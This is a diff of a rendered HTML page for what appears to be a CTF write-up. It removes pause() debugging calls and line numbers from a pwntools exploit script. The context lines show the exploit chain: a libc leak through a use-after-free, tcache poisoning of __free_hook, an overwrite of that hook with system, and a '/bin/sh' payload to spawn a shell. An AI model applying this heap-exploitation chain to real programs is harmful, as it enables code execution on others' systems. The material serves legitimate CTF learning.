@@ -81,7 +81,7 @@
           ·
         </span>
         <span>
-          5869 words
+          5851 words
         </span>
         <span class="split">
           ·
@@ -1825,15 +1825,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">213
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">214
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
@@ -1923,7 +1914,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After first connection, by default the binary will call malloc(0x40)</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and use this heap chunk for property variable</span>
 </span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter your name: &#39;</span>, p64(<span style="color:#f60">0xdeadbeef</span>))
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
 </span></span></span><span style="display:flex;"><span><span style="color:#c30">Part 1: Leak Libc base address
@@ -1942,7 +1932,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-2 got freed -&gt; unsorted_bin due to its large size</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-3 got freed -&gt; Tcache</span>
 </span></span><span style="display:flex;"><span>remove_property(r)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Due to bug on remove_property, even though we create a new property without comment,</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the property&#39;s comment still point to the freed chunk, hence we can leak libc address</span>
@@ -1958,7 +1947,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span>system <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;system&#39;</span>]
 </span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;__free_hook@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(free_hook)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
 </span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;system@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(system)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
 </span></span></span><span style="display:flex;"><span><span style="color:#c30">Part 2: Overwrite __free_hook with system
@@ -1989,7 +1977,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   new chunks those use the unsorted bin chunks via change username :)</span>
 </span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x89</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
 </span></span><span style="display:flex;"><span>remove_property(r)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now username and comment isn&#39;t pointing to the same chunk</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Notice that due to the freed comment chunk is not nulled by remove_property,</span>
@@ -2014,7 +2001,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># State after remove:</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># tcache_bins[0x60] = old street chunk &lt;- comment chunk</span>
 </span></span><span style="display:flex;"><span>remove_property(r)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create new property without comment. We&#39;re going to overwrite the freed comment chunk</span>
 </span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
@@ -2023,14 +2009,12 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After state:</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># tcache_bins[0x60] = __free_hook &lt;- comment chunk</span>
 </span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x20</span>, p64(free_hook), <span style="color:#069;font-weight:bold">True</span>)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Make malloc(0x49+1) to use the tcache_bins[0x60]</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After state:</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># tcache_bins[0x60] = __free_hook</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># street and comment pointing to the same chunk due to this</span>
 </span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x49</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x8</span>, <span style="color:#f60">0</span>)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Tricky part is here. Remember that:</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - username&#39;s stored size is 0x478</span>
@@ -2040,7 +2024,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - We want to modify the chunk size of the street, which is</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   the second 0x60 chunk starting from the address that username points</span>
 </span></span><span style="display:flex;"><span>change_username(r, <span style="color:#f60">500</span>, p64(<span style="color:#f60">0</span>)<span style="color:#555">*</span><span style="color:#f60">31</span> <span style="color:#555">+</span> p64(<span style="color:#f60">0x51</span>))
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Change the street stored size to smaller size first</span>
 </span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x8</span>, <span style="color:#f60">0</span>)
@@ -2051,7 +2034,6 @@ What we&rsquo;re going to do now is with <code>change_username</code>, forge the
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Malloc(0x49+1) to use the tcache_bins[0x60]. Because bins is pointing to</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   __free_hook, the street name is now pointing to it</span>
 </span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x49</span>, p64(system), <span style="color:#f60">0</span>)
-</span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set the comment value to /bin/sh</span>
 </span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, p64(system), <span style="color:#f60">13</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;/bin/sh</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>, <span style="color:#069;font-weight:bold">True</span>)
